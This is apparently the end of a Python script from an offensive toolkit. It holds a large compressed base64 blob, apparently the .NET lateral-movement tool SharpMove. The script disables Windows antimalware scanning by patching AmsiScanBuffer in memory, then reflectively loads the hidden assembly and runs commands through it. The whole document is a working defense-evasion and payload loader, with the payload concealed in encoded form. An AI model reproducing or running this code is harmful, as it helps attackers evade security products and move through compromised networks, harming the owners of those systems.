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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpMove.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    command_args = Array[str](command)

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()